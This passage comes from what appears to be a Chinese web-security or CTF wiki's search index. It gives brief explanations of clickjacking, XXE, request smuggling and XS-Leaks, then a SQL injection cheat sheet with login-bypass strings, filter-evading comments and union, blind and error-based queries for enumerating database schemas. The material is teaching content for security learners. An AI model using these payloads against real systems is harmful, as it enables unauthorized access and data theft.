\u9677\u3002","title":"\u6587\u4ef6\u4e0a\u4f20"},{"location":"web/introduction/#_4","text":"Clickjacking\uff08\u70b9\u51fb\u52ab\u6301\uff09\u662f\u7531\u4e92\u8054\u7f51\u5b89\u5168\u4e13\u5bb6\u7f57\u4f2f\u7279\u00b7\u6c49\u68ee\u548c\u8036\u5229\u7c73\u00b7\u683c\u52b3\u65af\u66fc\u5728 2008 \u5e74\u9996\u521b\u7684\u3002 \u662f\u4e00\u79cd\u89c6\u89c9\u6b3a\u9a97\u624b\u6bb5\uff0c\u5728 WEB \u7aef\u5c31\u662f iframe \u5d4c\u5957\u4e00\u4e2a\u900f\u660e\u4e0d\u53ef\u89c1\u7684\u9875\u9762\uff0c\u8ba9\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u70b9\u51fb\u653b\u51fb\u8005\u60f3\u8981\u6b3a\u9a97\u7528\u6237\u70b9\u51fb\u7684\u4f4d\u7f6e\u3002 \u7531\u4e8e\u70b9\u51fb\u52ab\u6301\u7684\u51fa\u73b0\uff0c\u4fbf\u51fa\u73b0\u4e86\u53cd frame \u5d4c\u5957\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u70b9\u51fb\u52ab\u6301\u9700\u8981 iframe \u5d4c\u5957\u9875\u9762\u6765\u653b\u51fb\u3002 \u4e0b\u9762\u4ee3\u7801\u662f\u6700\u5e38\u89c1\u7684\u9632\u6b62 frame \u5d4c\u5957\u7684\u4f8b\u5b50\uff1a if ( top . location != location ) top . location = self . location ;","title":"\u70b9\u51fb\u52ab\u6301"},{"location":"web/introduction/#vps","text":"VPS\uff08Virtual Private Server \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\u6280\u672f\uff0c\u5c06\u4e00\u90e8\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u4f18\u8d28\u670d\u52a1\u3002\u5b9e\u73b0 VPS \u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\uff0c\u548c\u865a\u62df\u5316\u6280\u672f\u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2a VPS \u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51 IP \u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540c VPS \u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU \u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u72ec\u5360\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS \u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS \u4e3a\u4f7f\u7528\u8005\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e IDC \u8d44\u6e90\u79df\u7528\u3002 IDC \u8d44\u6e90\u79df\u7528\uff0c\u7531 VPS \u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540c VPS \u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6 VPS \u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS \u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662f VPS \u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS \u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668 VPS \u7684\u4ef7\u683c\u90fd\u4f4e\u4e8e\u865a\u62df\u673a VPS \u7684\u4ef7\u683c\u3002","title":"VPS \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668"},{"location":"web/introduction/#_5","text":"\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u662f\u4e00\u79cd\u670d\u52a1\u5668\u7aef\u7684\u6f0f\u6d1e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u5728\u5904\u7406\u4e0d\u540c\u7528\u6237\u7684\u8bf7\u6c42\u65f6\u662f\u5e76\u53d1\u8fdb\u884c\u7684\uff0c\u56e0\u6b64\uff0c\u5982\u679c\u5e76\u53d1\u5904\u7406\u4e0d\u5f53\u6216\u76f8\u5173\u64cd\u4f5c\u903b\u8f91\u987a\u5e8f\u8bbe\u8ba1\u7684\u4e0d\u5408\u7406\u65f6\uff0c\u5c06\u4f1a\u5bfc\u81f4\u6b64\u7c7b\u95ee\u9898\u7684\u53d1\u751f\u3002","title":"\u6761\u4ef6\u7ade\u4e89"},{"location":"web/introduction/#xxe","text":"XXE Injection \u5373 XML External Entity Injection\uff0c\u4e5f\u5c31\u662f XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u653b\u51fb.\u6f0f\u6d1e\u662f\u5728\u5bf9\u975e\u5b89\u5168\u7684\u5916\u90e8\u5b9e\u4f53\u6570\u636e\u8fdb\u2f8f\u884c\u5904\u7406\u65f6\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898\u3002 \u5728 XML 1.0 \u6807\u51c6\u91cc\uff0cXML \u6587\u6863\u7ed3\u6784\u2fa5\u91cc\u5b9a\u4e49\u4e86\u5b9e\u4f53\uff08entity\uff09\u8fd9\u4e2a\u6982\u5ff5.\u5b9e\u4f53\u53ef\u4ee5\u901a\u8fc7\u9884\u5b9a\u4e49\u5728\u6587\u6863\u4e2d\u8c03\u7528\uff0c\u5b9e\u4f53\u7684\u6807\u8bc6\u7b26\u53ef\u8bbf\u95ee\u672c\u5730\u6216\u8fdc\u7a0b\u5185\u5bb9.\u5982\u679c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5f15\u5165\u4e86\u300c\u6c61\u67d3\u300d\u6e90\uff0c\u5728\u5bf9 XML \u6587\u6863\u5904\u7406\u540e\u5219\u53ef\u80fd\u5bfc\u81f4\u4fe1\u606f\u6cc4\u6f0f\u7b49\u5b89\u5168\u95ee\u9898\u3002","title":"XXE"},{"location":"web/introduction/#xsch","text":"\u7531\u4e8e\u7f51\u7ad9\u5f00\u53d1\u8005\u5728\u4f7f\u7528 Flash\u3001Silverlight \u7b49\u8fdb\u884c\u5f00\u53d1\u7684\u8fc7\u7a0b\u4e2d\u7684\u758f\u5ffd\uff0c\u6ca1\u6709\u5bf9\u8de8\u57df\u7b56\u7565\u6587\u4ef6\uff08crossdomain.xml\uff09\u8fdb\u884c\u6b63\u786e\u7684\u914d\u7f6e\u5bfc\u81f4\u95ee\u9898\u4ea7\u751f\u3002 \u4f8b\u5982\uff1a <cross-domain-policy> <allow-access-from domain= \u201c*\u201d/ > </cross-domain-policy> \u56e0\u4e3a\u8de8\u57df\u7b56\u7565\u6587\u4ef6\u914d\u7f6e\u4e3a * \uff0c\u4e5f\u5c31\u6307\u4efb\u610f\u57df\u7684 Flash \u90fd\u53ef\u4ee5\u4e0e\u5b83\u4ea4\u4e92\uff0c\u5bfc\u81f4\u53ef\u4ee5\u53d1\u8d77\u8bf7\u6c42\u3001\u83b7\u53d6\u6570\u636e\u3002","title":"XSCH"},{"location":"web/introduction/#_6","text":"\u8d8a\u6743\u6f0f\u6d1e\u662f WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u4e00\u79cd\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\u5b83\u7684\u5a01\u80c1\u5728\u4e8e\u4e00\u4e2a\u8d26\u6237\u5373\u53ef\u63a7\u5236\u5168\u7ad9\u7528\u6237\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e9b\u6570\u636e\u4ec5\u9650\u4e8e\u5b58\u5728\u6f0f\u6d1e\u529f\u80fd\u5bf9\u5e94\u7684\u6570\u636e\u3002\u8d8a\u6743\u6f0f\u6d1e\u7684\u6210\u56e0\u4e3b\u8981\u662f\u56e0\u4e3a\u5f00\u53d1\u4eba\u5458\u5728\u5bf9\u6570\u636e\u8fdb\u884c\u589e\u3001\u5220\u3001\u6539\u3001\u67e5\u8be2\u65f6\u5bf9\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6570\u636e\u8fc7\u5206\u76f8\u4fe1\u800c\u9057\u6f0f\u4e86\u6743\u9650\u7684\u5224\u5b9a\u3002\u6240\u4ee5\u6d4b\u8bd5\u8d8a\u6743\u5c31\u662f\u548c\u5f00\u53d1\u4eba\u5458\u62fc\u7ec6\u5fc3\u7684\u8fc7\u7a0b\u3002","title":"\u8d8a\u6743\uff08\u529f\u80fd\u7ea7\u8bbf\u95ee\u7f3a\u5931\uff09"},{"location":"web/introduction/#_7","text":"\u654f\u611f\u4fe1\u606f\u6307\u4e0d\u4e3a\u516c\u4f17\u6240\u77e5\u6089\uff0c\u5177\u6709\u5b9e\u9645\u548c\u6f5c\u5728\u5229\u7528\u4ef7\u503c\uff0c\u4e22\u5931\u3001\u4e0d\u5f53\u4f7f\u7528\u6216\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u5bf9\u793e\u4f1a\u3001\u4f01\u4e1a\u6216\u4e2a\u4eba\u9020\u6210\u5371\u5bb3\u7684\u4fe1\u606f\u3002\u5305\u62ec\uff1a\u4e2a\u4eba\u9690\u79c1\u4fe1\u606f\u3001\u4e1a\u52a1\u7ecf\u8425\u4fe1\u606f\u3001\u8d22\u52a1\u4fe1\u606f\u3001\u4eba\u4e8b\u4fe1\u606f\u3001IT \u8fd0\u7ef4\u4fe1\u606f\u7b49\u3002 \u6cc4\u9732\u9014\u5f84\u5305\u62ec Github\u3001\u767e\u5ea6\u6587\u5e93\u3001Google code\u3001\u7f51\u7ad9\u76ee\u5f55\u7b49\u3002","title":"\u654f\u611f\u4fe1\u606f\u6cc4\u9732"},{"location":"web/introduction/#_8","text":"Security Misconfiguration\uff1a\u6709\u65f6\u5019\uff0c\u4f7f\u7528\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u906d\u53d7\u591a\u79cd\u653b\u51fb\u3002\u5728\u5df2\u7ecf\u90e8\u7f72\u7684\u5e94\u7528\u3001WEB \u670d\u52a1\u5668\u3001\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ee3\u7801\u5e93\u4ee5\u53ca\u6240\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u7684\u7ec4\u4ef6\u4e2d\uff0c\u90fd\u5e94\u8be5\u4f7f\u7528\u73b0\u6709\u7684\u6700\u4f73\u5b89\u5168\u914d\u7f6e\uff0c\u8fd9\u4e00\u70b9\u81f3\u5173\u91cd\u8981\u3002","title":"\u9519\u8bef\u7684\u5b89\u5168\u914d\u7f6e"},{"location":"web/introduction/#_9","text":"\u5728 HTTP \u534f\u8bae\u4e2d\uff0c\u5b58\u5728\u4e24\u79cd Header \u6765\u6307\u5b9a\u8bf7\u6c42\u7684\u7ed3\u5c3e\uff0c\u5206\u522b\u662f Content-Length \u4ee5\u53ca Transfer-Encoding\u3002\u5728\u590d\u6742\u7684\u7f51\u7edc\u73af\u5883\u4e0b\uff0c\u4e0d\u540c\u7684\u670d\u52a1\u5668\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u5b9e\u73b0 RFC \u6807\u51c6\u3002\u56e0\u6b64\uff0c\u76f8\u540c\u7684 HTTP \u8bf7\u6c42\uff0c\u4e0d\u540c\u7684\u670d\u52a1\u5668\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u5904\u7406\u7ed3\u679c\uff0c\u8fd9\u6837\u5c31\u4ea7\u751f\u4e86\u4e86\u5b89\u5168\u98ce\u9669\u3002","title":"\u8bf7\u6c42\u8d70\u79c1"},{"location":"web/introduction/#tls","text":"\u5728 TLS \u534f\u8bae\u4e2d\uff0c\u5b58\u5728\u4e00\u79cd\u4f1a\u8bdd\u590d\u7528\u673a\u5236\uff0c\u5f53\u652f\u6301\u8be5\u7c7b\u7279\u6027\u7684\u5ba2\u6237\u7aef\u8bbf\u95ee\u4e86\u6076\u610f TLS \u670d\u52a1\u5668\u540e\uff0c\u5ba2\u6237\u7aef\u4f1a\u5b58\u50a8\u6076\u610f\u670d\u52a1\u5668\u4e0b\u53d1\u7684 Session \uff0c\u5728\u5ba2\u6237\u7aef\u91cd\u7528\u4f1a\u8bdd\u65f6\uff0c\u914d\u5408 DNS Rebinding \u53ef\u4ee5\u5b9e\u73b0\u8ba9\u5ba2\u6237\u7aef\u53d1\u9001\u6076\u610f Session \u81f3\u5185\u7f51\u670d\u52a1\uff0c\u4ece\u800c\u8fbe\u5230 SSRF \u653b\u51fb\u6548\u679c\uff0c\u5305\u62ec\u53ef\u4ee5\u4efb\u610f\u5199\u5165 Memcached \u7b49\u5185\u7f51\u670d\u52a1\uff0c\u8fdb\u800c\u914d\u5408\u5176\u4ed6\u6f0f\u6d1e\u9020\u6210 RCE \u7b49\u5371\u5bb3\u3002","title":"TLS \u6295\u6bd2"},{"location":"web/introduction/#xs-leaks","text":"\u8de8\u7ad9\u811a\u672c\u6cc4\u6f0f\uff08\u53c8\u79f0 XS-Leaks/XSLeaks\uff09\uff0c\u662f\u4e00\u7c7b\u5229\u7528 Web \u5e73\u53f0\u5185\u7f6e\u7684\u4fa7\u4fe1\u9053\u884d\u751f\u51fa\u6765\u7684\u6f0f\u6d1e\u3002\u5176\u539f\u7406\u662f\u5229\u7528\u7f51\u7edc\u4e0a\u7684\u8fd9\u79cd\u4fa7\u4fe1\u9053\u6765\u63ed\u793a\u7528\u6237\u7684\u654f\u611f\u4fe1\u606f\uff0c\u5982\u7528\u6237\u5728\u5176\u4ed6\u7f51\u7edc\u5e94\u7528\u4e2d\u7684\u6570\u636e\u3001\u7528\u6237\u672c\u5730\u73af\u5883\u4fe1\u606f\uff0c\u6216\u8005\u662f\u7528\u6237\u6240\u8fde\u63a5\u7684\u5185\u90e8\u7f51\u7edc\u4fe1\u606f\u7b49\u3002 \u8be5\u653b\u51fb\u5229\u7528\u4e86 Web \u5e73\u53f0\u7684\u6838\u5fc3\u539f\u5219--\u53ef\u7ec4\u5408\u6027\uff0c\u5373\u5141\u8bb8\u7f51\u7ad9\u4e4b\u95f4\u76f8\u4e92\u4f5c\u7528\uff0c\u5e76\u6ee5\u7528\u5408\u6cd5\u673a\u5236\u6765\u63a8\u65ad\u7528\u6237\u7684\u4fe1\u606f\u3002\u8be5\u653b\u51fb\u4e0e\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08CSRF\uff09\u6280\u672f\u4e3b\u8981\u533a\u522b\u5728\u4e8e XS-Leaks \u5e76\u4e0d\u4f2a\u9020\u7528\u6237\u8bf7\u6c42\u6267\u884c\u64cd\u4f5c\uff0c\u800c\u662f\u7528\u6765\u63a8\u65ad\u3001\u83b7\u53d6\u7528\u6237\u4fe1\u606f\u3002 \u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86\u5404\u79cd\u5404\u6837\u7684\u529f\u80fd\u6765\u652f\u6301\u4e0d\u540c Web \u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u4e92\u52a8\uff1b\u4f8b\u5982\uff0c\u6d4f\u89c8\u5668\u5141\u8bb8\u4e00\u4e2a\u7f51\u7ad9\u52a0\u8f7d\u5b50\u8d44\u6e90\u3001\u5bfc\u822a\u6216\u5411\u53e6\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u6d88\u606f\u3002\u867d\u7136\u8fd9\u4e9b\u884c\u4e3a\u901a\u5e38\u53d7\u5230\u7f51\u7edc\u5e73\u53f0\u7684\u5b89\u5168\u673a\u5236\u7684\u9650\u5236\uff08\u4f8b\u5982\u540c\u6e90\u653f\u7b56\uff09\uff0c\u4f46 XS-Leaks \u5229\u7528\u4e86\u7f51\u7ad9\u4e4b\u95f4\u4e92\u52a8\u8fc7\u7a0b\u4e2d\u7684\u5404\u79cd\u884c\u4e3a\u6765\u6cc4\u9732\u7528\u6237\u4fe1\u606f\u3002","title":"XS-Leaks"},{"location":"web/introduction/#waf","text":"Web \u5e94\u7528\u9632\u62a4\u7cfb\u7edf\uff08\u4e5f\u79f0\uff1a\u7f51\u7ad9\u5e94\u7528\u7ea7\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u3002\u82f1\u6587\uff1aWeb Application Firewall\uff0c\u7b80\u79f0\uff1aWAF\uff09\u3002\u5229\u7528\u56fd\u9645\u4e0a\u516c\u8ba4\u7684\u4e00\u79cd\u8bf4\u6cd5\uff1aWEB \u5e94\u7528\u9632\u706b\u5899\u662f\u901a\u8fc7\u6267\u884c\u4e00\u7cfb\u5217\u9488\u5bf9 HTTP/HTTPS \u7684\u5b89\u5168\u7b56\u7565\u6765\u4e13\u95e8\u4e3a WEB \u5e94\u7528\u63d0\u4f9b\u4fdd\u62a4\u7684\u4e00\u6b3e\u4ea7\u54c1\u3002","title":"WAF"},{"location":"web/introduction/#ids","text":"IDS \u662f\u82f1\u6587 Intrusion Detection Systems \u7684\u7f29\u5199\uff0c\u4e2d\u6587\u610f\u601d\u662f\u300c\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u300d\u3002\u4e13\u4e1a\u4e0a\u8bb2\u5c31\u662f\u4f9d\u7167\u4e00\u5b9a\u7684\u5b89\u5168\u7b56\u7565\uff0c\u901a\u8fc7\u8f6f\u3001\u786c\u4ef6\uff0c\u5bf9\u7f51\u7edc\u3001\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u51b5\u8fdb\u884c\u76d1\u89c6\uff0c\u5c3d\u53ef\u80fd\u53d1\u73b0\u5404\u79cd\u653b\u51fb\u4f01\u56fe\u3001\u653b\u51fb\u884c\u4e3a\u6216\u8005\u653b\u51fb\u7ed3\u679c\uff0c\u4ee5\u4fdd\u8bc1\u7f51\u7edc\u7cfb\u7edf\u8d44\u6e90\u7684\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u53ef\u7528\u6027\u3002\u505a\u4e00\u4e2a\u5f62\u8c61\u7684\u6bd4\u55bb\uff1a\u5047\u5982\u9632\u706b\u5899\u662f\u4e00\u5e62\u5927\u697c\u7684\u95e8\u9501\uff0c\u90a3\u4e48 IDS \u5c31\u662f\u8fd9\u5e62\u5927\u697c\u91cc\u7684\u76d1\u89c6\u7cfb\u7edf\u3002\u4e00\u65e6\u5c0f\u5077\u722c\u7a97\u8fdb\u5165\u5927\u697c\uff0c\u6216\u5185\u90e8\u4eba\u5458\u6709\u8d8a\u754c\u884c\u4e3a\uff0c\u53ea\u6709\u5b9e\u65f6\u76d1\u89c6\u7cfb\u7edf\u624d\u80fd\u53d1\u73b0\u60c5\u51b5\u5e76\u53d1\u51fa\u8b66\u544a\u3002","title":"IDS"},{"location":"web/introduction/#ips","text":"\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08IPS\uff1aIntrusion Prevention System\uff09\u662f\u7535\u8111\u7f51\u7edc\u5b89\u5168\u8bbe\u65bd\uff0c\u662f\u5bf9\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff08Antivirus Programs\uff09\u548c\u9632\u706b\u5899\uff08Packet Filter\uff0cApplication Gateway\uff09\u7684\u8865\u5145\u3002\u5165\u4fb5\u9884\u9632\u7cfb\u7edf\uff08Intrusion-prevention system\uff09\u662f\u4e00\u90e8\u80fd\u591f\u76d1\u89c6\u7f51\u7edc\u6216\u7f51\u7edc\u8bbe\u5907\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\uff0c\u80fd\u591f\u5373\u65f6\u7684\u4e2d\u65ad\u3001\u8c03\u6574\u6216\u9694\u79bb\u4e00\u4e9b\u4e0d\u6b63\u5e38\u6216\u662f\u5177\u6709\u4f24\u5bb3\u6027\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u3002","title":"IPS"},{"location":"web/introduction/#_10","text":"WEB \u6e17\u900f Wiki","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/sqli/","text":"SQL \u6ce8\u5165 \u00b6 \u57fa\u672c\u6982\u5ff5 \u00b6 SQL \u6ce8\u5165\u662f\u4e00\u79cd\u5c06 SQL \u4ee3\u7801\u63d2\u5165\u6216\u6dfb\u52a0\u5230\u5e94\u7528\uff08\u7528\u6237\uff09\u7684\u8f93\u5165\u53c2\u6570\u4e2d\uff0c\u4e4b\u540e\u518d\u5c06\u8fd9\u4e9b\u53c2\u6570\u4f20\u9012\u7ed9\u540e\u53f0\u7684 SQL \u670d\u52a1\u5668\u52a0\u4ee5\u89e3\u6790\u5e76\u6267\u884c\u7684\u653b\u51fb\u3002 \u653b\u51fb\u8005\u80fd\u591f\u4fee\u6539 SQL \u8bed\u53e5\uff0c\u8be5\u8fdb\u7a0b\u5c06\u4e0e\u6267\u884c\u547d\u4ee4\u7684\u7ec4\u4ef6\uff08\u5982\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u5e94\u7528\u670d\u52a1\u5668\u6216 WEB \u670d\u52a1\u5668\uff09\u62e5\u6709\u76f8\u540c\u7684\u6743\u9650\u3002 \u5982\u679c WEB \u5e94\u7528\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u786e\u4fdd\u5728\u5c06\u4ece WEB \u8868\u5355\u3001cookie\u3001\u8f93\u5165\u53c2\u6570\u7b49\u6536\u5230\u7684\u503c\u4f20\u9012\u7ed9 SQL \u67e5\u8be2\uff08\u8be5\u67e5\u8be2\u5728\u6570\u636e\u5e93\u670d\u52a1\u5668\u4e0a\u6267\u884c\uff09\u4e4b\u524d\u5df2\u7ecf\u5bf9\u5176\u8fdb\u884c\u8fc7\u9a8c\u8bc1\uff0c\u901a\u5e38\u5c31\u4f1a\u51fa\u73b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u3002 \u5e38\u7528\u5de5\u5177 \u00b6 Burp Suite\uff1a Burp Suite \u4f7f\u7528\u4ecb\u7ecd Tamper Data (Firefox addon) HackBar (Firefox addon) sqlmap\uff1a sqlmap \u7528\u6237\u624b\u518c \u6ce8\u5165\u5e38\u89c1\u53c2\u6570 \u00b6 user() \uff1a\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237 database() \uff1a\u5f53\u524d\u6570\u636e\u5e93\u540d version() \uff1a\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93\u7248\u672c @@datadir \uff1a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u8def\u5f84 concat() \uff1a\u8054\u5408\u6570\u636e\uff0c\u7528\u4e8e\u8054\u5408\u4e24\u6761\u6570\u636e\u7ed3\u679c\u3002\u5982 concat(username,0x3a,password) group_concat() \uff1a\u548c concat() \u7c7b\u4f3c\uff0c\u5982 group_concat(DISTINCT+user,0x3a,password) \uff0c\u7528\u4e8e\u628a\u591a\u6761\u6570\u636e\u4e00\u6b21\u6ce8\u5165\u51fa\u6765 concat_ws() \uff1a\u7528\u6cd5\u7c7b\u4f3c hex() \u548c unhex() \uff1a\u7528\u4e8e hex \u7f16\u7801\u89e3\u7801 load_file() \uff1a\u4ee5\u6587\u672c\u65b9\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u5728 Windows \u4e2d\uff0c\u8def\u5f84\u8bbe\u7f6e\u4e3a \\\\ select xxoo into outfile '\u8def\u5f84' \uff1a\u6743\u9650\u8f83\u9ad8\u65f6\u53ef\u76f4\u63a5\u5199\u6587\u4ef6 \u8bed\u6cd5\u53c2\u8003\u4e0e\u5c0f\u6280\u5de7 \u00b6 \u884c\u95f4\u6ce8\u91ca \u00b6 -- DROP sampletable ; -- # DROP sampletable ; # \u884c\u5185\u6ce8\u91ca \u00b6 /*\u6ce8\u91ca\u5185\u5bb9*/ DROP /*comment*/ sampletable ` DR /**/ OP /*\u7ed5\u8fc7\u8fc7\u6ee4*/ sampletable ` SELECT /*\u66ff\u6362\u7a7a\u683c*/ password /**/ FROM /**/ Members /*! MYSQL\u4e13\u5c5e */ SELECT /*!32302 1/0, */ 1 FROM tablename \u5b57\u7b26\u4e32\u7f16\u7801 \u00b6 ASCII() \uff1a\u8fd4\u56de\u5b57\u7b26\u7684 ASCII \u7801\u503c CHAR() \uff1a\u628a\u6574\u6570\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26 \u540e\u53f0\u4e07\u80fd\u5bc6\u7801 \u00b6 admin' -- admin' # admin'/* ' or 1=1-- ' or 1=1# ' or 1=1/* ') or '1'='1-- ') or ('1'='1-- \u4ee5\u4e0d\u540c\u7684\u7528\u6237\u767b\u9646 ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1-- \u6ce8\u5165\u8bed\u53e5\u5907\u5fd8 \u00b6 \u6570\u636e\u5e93\u540d \u00b6 SELECT database (); SELECT schema_name FROM information_schema . schemata ; \u8868\u540d \u00b6 union \u67e5\u8be2 --MySQL 4\u7248\u672c\u65f6\u7528version=9\uff0cMySQL 5\u7248\u672c\u65f6\u7528version=10 UNION SELECT GROUP_CONCAT ( table_name ) FROM information_schema . tables WHERE version = 10 ; /* \u5217\u51fa\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u7684\u8868 */ UNION SELECT TABLE_NAME FROM information_schema . tables WHERE TABLE_SCHEMA = database (); /* \u5217\u51fa\u6240\u6709\u7528\u6237\u81ea\u5b9a\u4e49\u6570\u636e\u5e93\u4e2d\u7684\u8868 */ SELECT table_schema , table_name FROM information_schema . tables WHERE table_schema != 'information_schema' AND table_schema != 'mysql' ; \u76f2\u6ce8 AND SELECT SUBSTR ( table_name , 1 , 1 ) FROM information_schema . tables > 'A' \u62a5\u9519 AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT table_name FROM information_schema . tables LIMIT 1 ))); -- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f\u3002 \u5217\u540d \u00b6 union \u67e5\u8be2 UNION SELECT GROUP_CONCAT ( column_name ) FROM information_schema . columns WHERE table_name = 'tablename' \u76f2\u6ce8 AND SELECT SUBSTR ( column_name , 1 , 1 ) FROM information_schema . columns > 'A' \u62a5\u9519 -- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f AND ( 1 , 2 , 3 ) = ( SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1 , 2 , 3 LIMIT 1 ) -- MySQL 5.1\u7248\u672c\u4fee\u590d\u4e86 AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT column_name FROM information_schema . columns LIMIT 1 ))); \u5229\u7528 PROCEDURE ANALYSE() -- \u8fd9\u4e2a\u9700\u8981 web \u5c55\u793a\u9875\u9762\u6709\u4f60\u6240\u6ce8\u5165\u67e5\u8be2\u7684\u4e00\u4e2a\u5b57\u6bb5 -- \u83b7\u5f97\u7b2c\u4e00\u4e2a\u6bb5\u540d SELECT username , permission FROM Users WHERE id = 1 ; 1 PROCEDURE ANALYSE () -- \u83b7\u5f97\u7b2c\u4e8c\u4e2a\u6bb5\u540d 1 LIMIT 1 , 1 PROCEDURE ANALYSE () -- \u83b7\u5f97\u7b2c\u4e09\u4e2a\u6bb5\u540d 1 LIMIT 2 , 1 PROCEDURE ANALYSE () \u6839\u636e\u5217\u540d\u67e5\u8be2\u6240\u5728\u7684\u8868 \u00b6 -- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e3a username \u7684\u8868 SELECT table_name FROM information_schema . columns WHERE column_name = 'username' ; -- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e2d\u5305\u542b username 